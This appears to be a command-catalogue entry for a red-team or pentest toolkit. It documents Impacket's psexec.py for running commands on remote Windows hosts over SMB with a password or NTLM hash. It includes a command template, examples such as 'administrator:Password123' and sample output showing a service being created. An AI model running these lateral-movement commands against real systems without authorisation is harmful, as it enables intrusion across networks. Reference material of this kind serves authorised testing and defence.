---
id: 12a1647e-62a4-43af-aaa5-7f14db280216
name: impacket-psexec-execute-remote-command
type: command
executor: bash
data: >-
  python3 psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
  '$_REMOTE_COMMAND'
output: null
created_at: '2023-04-06T03:56:30.784576+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - impacket
  - lateral-movement
verified: true
validated: true
---

# impacket-psexec-execute-remote-command

## Command

```bash
python3 psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP '$_REMOTE_COMMAND'
```

## Description

Executes a single command on a remote Windows host using Impacket's psexec.py, which emulates PsExec by uploading and running a temporary service over SMB. Use this for quick lateral movement or reconnaissance with valid credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name (or empty for local) | No |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password or NTLM hash for the user | Yes |
| $_TARGET_IP | IP address or hostname of the target Windows system | Yes |
| $_REMOTE_COMMAND | Command to execute on the target (enclose in quotes if spaces) | Yes |
| -debug | Enable debug output for troubleshooting (optional flag) | No |

## Examples

### Basic Usage

```bash
python3 psexec.py WORKGROUP/administrator:Password123@192.168.1.100 'cmd.exe /c whoami'
```

### Advanced Usage (with Hash)

```bash
python3 psexec.py DOMAIN/user:HASH@192.168.1.100 'cmd.exe /c systeminfo > C:\temp\info.txt'
```

## Expected Output

Impacket v0.9.24 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.1.100.....
[*] Found writable share ADMIN$\n[*] Uploading file YRRgHf.exe
[*] Opening SVCManager on 192.168.1.100...
[*] Creating service gseRM on 192.168.1.100...
whoami
DOMAIN\administrator

[!] Press help for extra shell commands.

Description of output: Authentication success, file upload confirmation, service creation, and the remote command's stdout (e.g., current user). Errors like 'Access Denied' indicate privilege issues.
